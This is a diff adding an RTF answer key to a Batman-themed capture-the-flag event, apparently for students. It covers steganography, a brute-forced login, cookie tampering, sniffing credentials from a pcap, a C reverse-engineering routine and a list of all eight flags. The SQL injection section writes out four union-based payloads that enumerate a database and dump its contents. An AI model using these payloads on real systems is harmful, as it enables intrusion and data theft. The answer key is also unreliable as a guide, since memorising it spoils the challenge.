@@ -1,0 +1,125 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf130
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww28600\viewh18000\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 Q1) Image Steganography\
+	Download the image and open it in a text editor. Scroll till the end and you\'92ll find the flag.\
+\
+Q2) Brute forcing\
+	username: admin\
+	password: Qwerty\
+\
+Q3) Cookie manipulation\
+	Inspect the webpage and you\'92ll find a cookie by the name of BatMobile. Change the cookie value to Unlock. To change the value, download a Mozilla plugin called Cookie Editor.\
+\
+Q4) Union based sql injection\
+	Type the following queries in the input field.\
+	\
+	-> 1\'92 and 1=0 union select 1, schema_name from information_schema.schemata;#\
+	-> 1\'92 and 1=0 union select 1, table_name from information_schema.tables where 		table_schema=\'91hack\'92;#\
+	-> 1\'92 and 1=0 union select 1, column_name from information_schema.columns where 		column_schema=\'91hack\'92;#\
+	-> 1\'92 and 1=0 union select 1, flag from Joker;#\
+\
+The first query gives you the name of the current database. \
+The second query would give you all the tables in the database.\
+The third query enlists all the columns in the database.\
+The flag is a column name in the table Joker in the database hack. The fourth query gives you the value in the flag field.\
+\
+Q5) Cryptography\
+	shift 2 keys to the right on the keyboard\
+	Q -> E\
+	v -> N\
+	A -> D\
+	and for the end keys, loop to the other side of the keyboard\
+\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 Q6) Audio Steganography\
+For the audio file uploaded you need to open the sound file in audacity and than add a layer than use a tool to look at wave form you can see the text written.\
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+\cf0 \
+Q7) Network Sniffing\
+	Download the .pcap file. \
+	Open it using wireshark. \
+	Filter the traffic by putting in the keyword: http.request.method==POST.\
+	Right click on the packet and follow tcp stream.\
+	There you have the login id and password\
+	However there was a bug in the question and you were able to get to the answer by simply signing up.\
+\
+\
+Q8) Reverse Engineering\
+#include <math.h>\
+#include <stdio.h>\
+#include <string.h>\
+#include <stdlib.h>\
+#include <assert.h>\
+#include <limits.h>\
+#include <stdbool.h>\
+\
+int main()\{\
+   \
+    char* s = (char *)malloc(10240 * sizeof(char));\
+    scanf("%s",s);\
+    int l = strlen(s);\
+    if(l<4)\{\
+        return 0;\
+    \}\
+    int k = 0;\
+    int i;\
+    for(i=0;i<l;i++)\{\
+        if(i%2==0)\{\
+        k = (pow(l,2)-i);\
+            k = k%26; \
+       if (s[i]>96 && s[i]<123)\{\
+            int tmp = s[i] + k;\
+            if(tmp>122)\{\
+                tmp = tmp - 26;\
+            \}\
+             s[i] = tmp;\
+          \}\
+            if (s[i]>64 && s[i]<91)\{\
+            int tmp = s[i] + k;\
+            if(tmp>91)\{\
+                tmp = tmp - 26;\
+            \}\
+             s[i] = tmp;\
+          \}\
+        \}\
+        if(i%2==1)\{\
+        k = (pow(l,2)-i);\
+         k = k%26; \
+       if (s[i]>96 && s[i]<123)\{\
+            int tmp = s[i] + k;\
+            if(tmp>122)\{\
+                tmp = tmp - 26;\
+            \}\
+             s[i] = tmp;\
+          \}\
+            if (s[i]>64 && s[i]<91)\{\
+            int tmp = s[i] + k;\
+            if(tmp>91)\{\
+                tmp = tmp - 26;\
+            \}\
+             s[i] = tmp;\
+          \}\
+    \}\
+    \}\
+    printf("%s\\n",s);\
+    system("PAUSE");\
+    return 0;\
+\}\
+\
+\
+\
+\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\
+Flags\
+\
+1) Be fast Batsy!\
+2) Force did work\
+3) A550\
+4) LexLuthar Lab, 1630 : Fear\
+5) END OF KRYPTONIAN'S LOVE\
+6) I think you and I are destined to do this forever\
+7) 16th January 2014, at Arkham\
+8) BATMANvsSUPERMAN}
